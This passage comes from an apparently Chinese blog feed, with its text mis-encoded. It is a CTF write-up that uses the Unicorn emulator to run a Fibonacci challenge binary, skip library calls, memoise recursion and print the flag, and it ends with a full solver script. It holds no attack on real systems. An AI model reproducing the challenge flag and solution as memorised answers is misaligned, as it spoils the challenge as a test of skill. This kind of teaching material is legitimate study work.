åˆ™å¤ªè¿‡å¤æ‚ï¼Œä¸”æ˜“äº§ç”Ÿ<code>bug</code>ï¼Œè€Œä½¿ç”¨<code>unicorn</code>å°±èƒ½å¾ˆå¥½åœ°é¿å…è¿™ä¸ªé—®é¢˜ã€‚</p><h3 id="1-åˆ©ç”¨unicornè¿è¡Œç›®æ ‡ç¨‹åº"><a href="#1-åˆ©ç”¨unicornè¿è¡Œç›®æ ‡ç¨‹åº" class="headerlink" title="1. åˆ©ç”¨unicornè¿è¡Œç›®æ ‡ç¨‹åº"></a>1. åˆ©ç”¨unicornè¿è¡Œç›®æ ‡ç¨‹åº</h3><p>é¦–å…ˆå…ˆå°†éœ€è¦çš„åº“å¯¼å…¥ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> unicorn <span class="keyword">import</span> *<span class="comment"># å¯¼å…¥unicornåº“</span></span><br><span class="line"><span class="keyword">from</span> unicorn.x86_const <span class="keyword">import</span> *<span class="comment"># å› ä¸ºç¨‹åºæ˜¯x86æ¶æ„çš„ï¼Œæ•…å¯¼å…¥x86çš„å¸¸é‡</span></span><br><span class="line"><span class="keyword">import</span> struct<span class="comment"># ç”¨äºæ‰“åŒ…æ•°æ®</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_file</span>(<span class="params">name</span>):<span class="comment"># è¯»å–ç›®æ ‡æ–‡ä»¶çš„æ•°æ®</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(name,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:<span class="comment"># ä»¥äºŒè¿›åˆ¶æ ¼å¼æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶ç”¨äºåªè¯»</span></span><br><span class="line">        <span class="keyword">return</span> f.read()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">u32</span>(<span class="params">data</span>):<span class="comment"># è§£åŒ…æ•°æ®</span></span><br><span class="line">    <span class="keyword">return</span> struct.unpack(<span class="string">&quot;I&quot;</span>,data)[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">p32</span>(<span class="params">num</span>):<span class="comment"># æ‰“åŒ…æ•°æ®</span></span><br><span class="line">    <span class="keyword">return</span> struct.pack(<span class="string">&quot;I&quot;</span>,num)</span><br></pre></td></tr></table></figure><p>è®°ä½<code>python3</code>ä¸‹äºŒè¿›åˆ¶æ–‡ä»¶çš„æ‰“å¼€å½¢å¼ä¸º<strong>â€˜rbâ€™</strong>ï¼Œå¦åˆ™ä¼šæŠ¥å¦‚ä¸‹é”™è¯¯ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UnicodeDecodeError: <span class="string">&#x27;utf-8&#x27;</span> codec can<span class="string">&#x27;t decode byte 0x90 in position 24: invalid start byte</span></span><br></pre></td></tr></table></figure><p>é¦–å…ˆå®ä¾‹åŒ–ä¸€ä¸ªåŸºäº<code>X86</code>æ¶æ„çš„æ¨¡å¼ä¸º<code>64ä½</code>çš„æ¨¡æ‹Ÿå™¨ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mu = Uc(UC_ARCH_X86, UC_MODE_64)<span class="comment"># å…¶ä»–æ¶æ„å’Œæ¨¡å¼è¯¦è§æ–‡æ¡£</span></span><br></pre></td></tr></table></figure><p>æ¥ç€å¼€è¾Ÿä¸¤æ®µç©ºé—´ï¼Œä¸€æ®µç”¨äºå‚¨å­˜ç¨‹åºä»£ç ï¼Œå¦ä¸€æ®µç”¨äºæ¨¡æ‹Ÿæ ˆï¼Œç”³è¯·å¤§å°å‡ä¸º1024<em>1024(å³*<em>1MB</em></em>)ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">prog_base = <span class="number">0x400000</span><span class="comment"># åˆå§‹ç©ºé—´åœ°å€</span></span><br><span class="line">prog_size = <span class="number">1024</span>*<span class="number">1024</span><span class="comment"># ç©ºé—´å¤§å°</span></span><br><span class="line">stack_base = <span class="number">0x0</span><span class="comment"># åˆè¯•æ ˆåœ°å€</span></span><br><span class="line">stack_size = <span class="number">1024</span>*<span class="number">1024</span><span class="comment"># æ ˆå¤§å°</span></span><br><span class="line"></span><br><span class="line">mu.mem_map(prog_base, prog_size)<span class="comment"># ç”³è¯·(æ˜ å°„) 1MB å†…å­˜ç”¨äºå­˜æ”¾ç¨‹åº</span></span><br><span class="line">mu.mem_map(stack_base, stack_size)<span class="comment"># ç”³è¯·(æ˜ å°„) 1MB å†…å­˜ç”¨äºå­˜æ”¾æ ˆ</span></span><br><span class="line"></span><br><span class="line">mu.mem_write(prog_base, read_file(<span class="string">&quot;./fibonacci&quot;</span>))<span class="comment"># å†™å…¥ç¨‹åº</span></span><br><span class="line">mu.reg_write(UC_X86_REG_RSP, stack_base+stack_size-<span class="number">1</span>)<span class="comment"># ä¿®æ”¹RSPæŒ‡é’ˆ</span></span><br></pre></td></tr></table></figure><p>è®¾ç½®ç¨‹åºçš„åŠ è½½åœ°å€å’Œç»“æŸåœ°å€ï¼Œåˆ†åˆ«ä¸º<code>0x4004E0</code>å’Œ<code>0x400575</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">start = <span class="number">0x4004E0</span></span><br><span class="line">end = <span class="number">0x400575</span></span><br><span class="line">mu.emu_start(start, end)<span class="comment"># ä»startå¼€å§‹æ‰§è¡Œç›´è‡³end</span></span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬è¿è¡Œä¸€ä¸‹è„šæœ¬ï¼Œå‘ç°æŠ¥é”™ï¼Œè¯´æ˜¯è¯»åˆ°éæ³•çš„åœ°å€ï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;try.py&quot;</span>, line 28, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    mu.emu_start(start, end)</span><br><span class="line">  File <span class="string">&quot;/home/fuzz/.local/lib/python3.8/site-packages/unicorn/unicorn.py&quot;</span>, line 525, <span class="keyword">in</span> emu_start</span><br><span class="line">    raise UcError(status)</span><br><span class="line">unicorn.unicorn.UcError: Invalid memory <span class="built_in">read</span> (UC_ERR_READ_UNMAPPED)</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆæ˜¯èµ°åˆ°å“ªä¸€æ­¥æŠ¥é”™äº†å‘¢ï¼Ÿæˆ‘ä»¬éœ€è¦æ·»åŠ <code>hook</code>å°†æˆåŠŸæ‰§è¡Œçš„ä»£ç å’Œå…¶<strong>å¤§å°</strong>ç»™æ‰“å°å‡ºæ¥ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">hook_code</span>(<span class="params">mu, address, size, user_data</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;&gt;&gt;&gt; Tracing instruction at 0x%x, instruction size = 0x%x&#x27;</span> %(address, size))</span><br><span class="line">mu.hook_add(UC_HOOK_CODE, hook_code)<span class="comment"># æ·»åŠ äº†hookåæ¯æ‰§è¡Œä¸€å¥ä»£ç å°±ä¼šæ‰§è¡Œhook_codeå†…çš„æ“ä½œ</span></span><br></pre></td></tr></table></figure><p>å†æ¬¡è¿è¡Œï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">fuzz@fuzz-virtual-machine:~/unicorn-ctf$ python3 try.py </span><br><span class="line">&gt;&gt;&gt; Tracing instruction at 0x4004e0, instruction size = 0x1</span><br><span class="line">&gt;&gt;&gt; Tracing instruction at 0x4004e1, instruction size = 0x1</span><br><span class="line">&gt;&gt;&gt; Tracing instruction at 0x4004e2, instruction size = 0x2</span><br><span class="line">&gt;&gt;&gt; Tracing instruction at 0x4004e4, instruction size = 0x5</span><br><span class="line">&gt;&gt;&gt; Tracing instruction at 0x4004e9, instruction size = 0x2</span><br><span class="line">&gt;&gt;&gt; Tracing instruction at 0x4004eb, instruction size = 0x4</span><br><span class="line">&gt;&gt;&gt; Tracing instruction at 0x4004ef, instruction size = 0x7</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;try.py&quot;</span>, line 34, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    mu.emu_start(start, end)</span><br><span class="line">  File <span class="string">&quot;/home/fuzz/.local/lib/python3.8/site-packages/unicorn/unicorn.py&quot;</span>, line 525, <span class="keyword">in</span> emu_start</span><br><span class="line">    raise UcError(status)</span><br><span class="line">unicorn.unicorn.UcError: Invalid memory <span class="built_in">read</span> (UC_ERR_READ_UNMAPPED)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å¯ä»¥å¾—çŸ¥ï¼Œç¨‹åºåœ¨æ‰§è¡Œå¦‚ä¸‹<code>code</code>æŠ¥é”™ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004004EF                 mov     rdi, cs:stdout  ; stream</span><br></pre></td></tr></table></figure><p>å› ä¸ºæˆ‘ä»¬æœªåœ¨ç©ºé—´é‡Œå¼•å…¥<code>glibc</code>ï¼Œæ‰€ä»¥ç›´æ¥è·³è¿‡è¿™äº›å‡½æ•°å°±å¥½äº†ï¼Œé™¤æ­¤ä¹‹å¤–è¿˜éœ€è·³è¿‡çš„<code>code</code>æœ‰ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004004F6                 call    _setbuf</span><br><span class="line">.text:0000000000400502                 call    _printf</span><br><span class="line">.text:000000000040054F                 mov     rsi, cs:stdout  ; fp</span><br></pre></td></tr></table></figure><p>å¯ä»¥é€šè¿‡æ”¹å†™<code>rip</code>è¿›è¡Œè·³è¿‡ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mu.reg_write(UC_X86_REG_RIP, address+size)</span><br></pre></td></tr></table></figure><p>å½“ç„¶æˆ‘ä»¬å¯¹æ‰“å°å‡½æ•°ä¹Ÿåº”å½“è¿›è¡Œå¤„ç†ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000400558                 movsx   edi, dil        ; c</span><br><span class="line">.text:000000000040055C                 add     rbp, 1</span><br><span class="line">.text:0000000000400560                 call    __IO_putc</span><br></pre></td></tr></table></figure><p><code>__IO_putc</code>å°†å¯„å­˜å™¨<code>rdi</code>å†…çš„å…ƒç´ è¿›è¡Œè¾“å‡ºï¼Œæˆ‘ä»¬å¯ä»¥å¯¹å…¶è¿›è¡Œæ”¹å†™ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c = mu.reg_read(UC_X86_REG_RDI)<span class="comment"># è¯»å‡º rdi é‡Œçš„å€¼è¿›è¡Œæ‰“å°</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">chr</span>(c))</span><br><span class="line">mu.reg_write(UC_X86_REG_RIP, address+size)</span><br></pre></td></tr></table></figure><p>å› æ­¤<code>hook_code</code>æœ‰ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">instructions_skip_list = [<span class="number">0x4004EF</span>,<span class="number">0x4004F6</span>,<span class="number">0x400502</span>,<span class="number">0x40054F</span>]<span class="comment"># è·³è¿‡glibcå‡½æ•°</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hook_code</span>(<span class="params">mu, address, size, user_data</span>):</span><br><span class="line">    <span class="comment">#print(&#x27;&gt;&gt;&gt; Tracing instruction at 0x%x, instruction size = 0x%x&#x27; %(address, size))</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> address <span class="keyword">in</span> instructions_skip_list:</span><br><span class="line">        mu.reg_write(UC_X86_REG_RIP, address+size)</span><br><span class="line">    <span class="keyword">elif</span> address == <span class="number">0x400560</span>:<span class="comment"># æ‰§è¡Œåˆ°__IO_putcä¾¿æ‰“å°rdiçš„å€¼ï¼Œå¹¶è·³è¿‡</span></span><br><span class="line">        c = mu.reg_read(UC_X86_REG_RDI)</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">chr</span>(c))</span><br><span class="line">        mu.reg_write(UC_X86_REG_RIP, address+size)</span><br></pre></td></tr></table></figure><p>å†æ¬¡æ‰§è¡Œï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">fuzz@fuzz-virtual-machine:~/unicorn-ctf$ python3 try.py </span><br><span class="line">h</span><br><span class="line">x</span><br><span class="line">p</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å‘ç°æ‰“å°<code>flag</code>ä¾æ—§å¾ˆæ…¢ï¼Œå› æ­¤å°±éœ€è¦å¼€å§‹æˆ‘ä»¬çš„ä¼˜åŒ–å·¥ä½œ</p><h3 id="2-ä¼˜åŒ–ç¨‹åºï¼Œæé«˜é€Ÿåº¦"><a href="#2-ä¼˜åŒ–ç¨‹åºï¼Œæé«˜é€Ÿåº¦" class="headerlink" title="2. ä¼˜åŒ–ç¨‹åºï¼Œæé«˜é€Ÿåº¦"></a>2. ä¼˜åŒ–ç¨‹åºï¼Œæé«˜é€Ÿåº¦</h3><p>å¾ˆæ˜¾ç„¶è®¸å¤šå‚æ•°ä»¥åŠè¿”å›å€¼ä¸€æ ·çš„<code>FIB</code>å‡½æ•°è¢«é‡å¤è°ƒç”¨äº†å¤šæ¬¡ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦å¯¹è¿™äº›è¢«é‡å¤è°ƒç”¨è¿‡çš„å‡½æ•°è¿›è¡Œè®°å½•ï¼Œå½“å‚æ•°ä¸€æ ·æ—¶ï¼Œä¸å†ç»è¿‡ä¸­é—´çš„è®¡ç®—ï¼Œè€Œç›´æ¥ç»™å‡ºè¿”å›å€¼ã€‚</p><p>å¦‚ä½•ä¿å­˜è¿™äº›æˆå¯¹çš„å€¼ï¼Ÿ</p><ul><li>åœ¨å‡½æ•°å¼€å§‹çš„æ—¶å€™ï¼Œæˆ‘ä»¬å¯ä»¥æ£€æŸ¥å‚æ•°å¯¹åº”çš„å€¼æ˜¯å¦å·²ç»è¢«dictè®°å½•<ul><li>å¦‚æœæ˜¯ï¼Œç›´æ¥è¿”å›è¿™ä¸ªkey-valueå°±è¡Œï¼Œåªéœ€å°†è¿”å›å€¼å†™å…¥åˆ°<code>RAX</code>ä¸­ï¼ŒåŒæ—¶è®¾ç½®<code>RIP</code>ä¸º<code>RET</code>æŒ‡ä»¤çš„å€¼ï¼Œé€€å‡ºè¿™ä¸ªå‡½æ•°ã€‚ä¸èƒ½åœ¨<code>fabonacci</code>å‡½æ•°å†…ç›´æ¥è·³è½¬åˆ°<code>RET</code>ï¼Œå› ä¸ºè¿™æ¡æŒ‡ä»¤å·²ç»è¢«HOOKäº†ï¼Œæ‰€ä»¥æˆ‘ä»¬è·³è½¬åˆ°<code>main</code>ä¸­çš„<code>ret</code>ã€‚</li><li>å¦‚æœdictä¸­æ²¡æœ‰å‡ºç°å‚æ•°å’Œå¯¹åº”çš„å€¼ï¼Œå°†å‚æ•°æ·»åŠ åˆ°dictä¸­ã€‚</li></ul></li><li>å½“é€€å‡ºå‡½æ•°çš„æ—¶å€™ï¼Œä¿å­˜è¿”å›å€¼ã€‚å¯ä»¥ä»æˆ‘ä»¬çš„æ ˆç»“æ„ä¸­è¯»å–å‚æ•°å’Œè¿”å›å€¼ã€‚</li></ul><p>å› æ­¤æˆ‘ä»¬éœ€è¦åœ¨æ‰§è¡Œåˆ°<code>FIB</code>å‡½æ•°æ—¶è¿›è¡Œåˆ¤æ–­ï¼Œåœ¨<code>FIB</code>è¿”å›çš„æ—¶å€™è¿›è¡Œæ›´æ–°ï¼Œæ„é€ å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">Fib_entry = <span class="number">0x400670</span></span><br><span class="line">Fib_return = [<span class="number">0x4006F1</span>, <span class="number">0x400709</span>]</span><br><span class="line"></span><br><span class="line">stack = []</span><br><span class="line">d = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hook_code</span>(<span class="params">mu, address, size, user_data</span>):</span><br><span class="line">    <span class="comment">#print(&#x27;&gt;&gt;&gt; Tracing instruction at 0x%x, instruction size = 0x%x&#x27; %(address, size))</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> address <span class="keyword">in</span> instructions_skip_list:</span><br><span class="line">        mu.reg_write(UC_X86_REG_RIP, address+size)</span><br><span class="line">    <span class="keyword">elif</span> address == <span class="number">0x400560</span>:</span><br><span class="line">        c = mu.reg_read(UC_X86_REG_RDI)</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">chr</span>(c))</span><br><span class="line">        mu.reg_write(UC_X86_REG_RIP, address+size)</span><br><span class="line">    <span class="keyword">elif</span> address == Fib_entry:</span><br><span class="line">        arg0 = mu.reg_read(UC_X86_REG_RDI)</span><br><span class="line">        r_rsi = mu.reg_read(UC_X86_REG_RSI)</span><br><span class="line">        arg1 = u32(mu.mem_read(r_rsi,<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (arg0,arg1) <span class="keyword">in</span> d:</span><br><span class="line">            (ret_rax, ret_ref) = d[(arg0,arg1)]</span><br><span class="line">            mu.reg_write(UC_X86_REG_RAX, ret_rax)</span><br><span class="line">            mu.mem_write(r_rsi, p32(ret_ref))</span><br><span class="line">            mu.reg_write(UC_X86_REG_RIP,<span class="number">0x400582</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            stack.append((arg0,arg1,r_rsi))</span><br><span class="line">    <span class="keyword">elif</span> address <span class="keyword">in</span> Fib_return:</span><br><span class="line">        (arg0, arg1, r_rsi) = stack.pop()</span><br><span class="line">        ret_rax = mu.reg_read(UC_X86_REG_RAX)</span><br><span class="line">        ret_ref = u32(mu.mem_read(r_rsi,<span class="number">4</span>))</span><br><span class="line">        d[(arg0, arg1)] = (ret_rax, ret_ref)</span><br></pre></td></tr></table></figure><p>å†æ¬¡è¿è¡Œè„šæœ¬ï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">fuzz@fuzz-virtual-machine:~/unicorn-ctf$ python3 exp.py </span><br><span class="line">h</span><br><span class="line">x</span><br><span class="line">p</span><br><span class="line">&#123;</span><br><span class="line">F</span><br><span class="line">1</span><br><span class="line">b</span><br><span class="line">0</span><br><span class="line">n</span><br><span class="line">4</span><br><span class="line">c</span><br><span class="line">C</span><br><span class="line">i</span><br><span class="line">_</span><br><span class="line">n</span><br><span class="line">u</span><br><span class="line">m</span><br><span class="line">Z</span><br><span class="line">_</span><br><span class="line">4</span><br><span class="line">r</span><br><span class="line">3</span><br><span class="line">_</span><br><span class="line">T</span><br><span class="line">0</span><br><span class="line">O</span><br><span class="line">_</span><br><span class="line">3</span><br><span class="line">a</span><br><span class="line">5</span><br><span class="line">Y</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-å®Œæ•´EXP"><a href="#3-å®Œæ•´EXP" class="headerlink" title="3. å®Œæ•´EXP"></a>3. å®Œæ•´EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> unicorn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> unicorn.x86_const <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_file</span>(<span class="params">name</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(name,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> f.read()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">u32</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">return</span> struct.unpack(<span class="string">&quot;I&quot;</span>,data)[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">p32</span>(<span class="params">num</span>):</span><br><span class="line">    <span class="keyword">return</span> struct.pack(<span class="string">&quot;I&quot;</span>,num)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mu = Uc(UC_ARCH_X86, UC_MODE_64)</span><br><span class="line"></span><br><span class="line">prog_base = <span class="number">0x400000</span></span><br><span class="line">stack_base = <span class="number">0x0</span></span><br><span class="line">stack_size = <span class="number">1024</span>*<span class="number">1024</span></span><br><span class="line"></span><br><span class="line">mu.mem_map(prog_base, <span class="number">1024</span>*<span class="number">1024</span>)</span><br><span class="line">mu.mem_map(stack_base, stack_size)</span><br><span class="line"></span><br><span class="line">mu.mem_write(prog_base, read_file(<span class="string">&quot;./fibonacci&quot;</span>))</span><br><span class="line">mu.reg_write(UC_X86_REG_RSP, stack_base+stack_size-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">start = <span class="number">0x4004E0</span></span><br><span class="line">end = <span class="number">0x400575</span></span><br><span class="line"></span><br><span class="line">instructions_skip_list = [<span class="number">0x4004EF</span>,<span class="number">0x4004F6</span>,<span class="number">0x400502</span>,<span class="number">0x40054F</span>]</span><br><span class="line"></span><br><span class="line">Fib_entry = <span class="number">0x400670</span></span><br><span class="line">Fib_return = [<span class="number">0x4006F1</span>, <span class="number">0x400709</span>]</span><br><span class="line"></span><br><span class="line">stack = []</span><br><span class="line">d = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hook_code</span>(<span class="params">mu, address, size, user_data</span>):</span><br><span class="line">    <span class="comment">#print(&#x27;&gt;&gt;&gt; Tracing instruction at 0x%x, instruction size = 0x%x&#x27; %(address, size))</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> address <span class="keyword">in</span> instructions_skip_list:</span><br><span class="line">        mu.reg_write(UC_X86_REG_RIP, address+size)</span><br><span class="line">    <span class="keyword">elif</span> address == <span class="number">0x400560</span>:</span><br><span class="line">        c = mu.reg_read(UC_X86_REG_RDI)</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">chr</span>(c))</span><br><span class="line">        mu.reg_write(UC_X86_REG_RIP, address+size)</span><br><span class="line">    <span class="keyword">elif</span> address == Fib_entry:</span><br><span class="line">        arg0 = mu.reg_read(UC_X86_REG_RDI)</span><br><span class="line">        r_rsi = mu.reg_read(UC_X86_REG_RSI)</span><br><span class="line">        arg1 = u32(mu.mem_read(r_rsi,<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (arg0,arg1) <span class="keyword">in</span> d:</span><br><span class="line">            (ret_rax, ret_ref) = d[(arg0,arg1)]</span><br><span class="line">            mu.reg_write(UC_X86_REG_RAX, ret_rax)</span><br><span class="line">            mu.mem_write(r_rsi, p32(ret_ref))</span><br><span class="line">            mu.reg_write(UC_X86_REG_RIP,<span class="number">0x400582</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            stack.append((arg0,arg1,r_rsi))</span><br><span class="line">    <span class="keyword">elif</span> address <span class="keyword">in</span> Fib_return:</span><br><span class="line">        (arg0, arg1, r_rsi) = stack.pop()</span><br><span class="line">        ret_rax = mu.reg_read(UC_X86_REG_RAX)</span><br><span class="line">        ret_ref = u32(mu.mem_read(r_rsi,<span class="number">4</span>))</span><br><span class="line">        d[(arg0, arg1)] = (ret_rax, ret_ref)</span><br><span class="line"></span><br><span class="line">mu.hook_add(UC_HOOK_CODE, hook_code)</span><br><span class="line">mu.emu_start(start, end)</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;ç»“åˆ ctfèµ›é¢˜ å­¦ä¹ ä¸€ä¸‹ unicorn å¼•æ“çš„åŸºç¡€ä½¿ç”¨ã€‚&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://bbs.pediy.com/thread-224330.htm#msg_header_h3_1&quot;&gt;å‚è€ƒæ–‡ç« &lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/kabeor/Unicorn-Engine-Documentation/blob/master/Unicorn-Engine%20Documentation.md&quot;&gt;unicornä¸­æ–‡æ–‡æ¡£&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="other" scheme="http://example.com/categories/other/"/>
    
    
  </entry>
  
  <entry>
    <title>ciscn2022</title>
    <link href="http://example.com/2022/05/30/ciscn2022/"/>
    <id>http://example.com/2022/05/30/ciscn2022/</id>
    <published>2022-05-30T03:41:37.000Z</published>
    <updated>2023-01-18T08:54:33.015Z</updated>
    
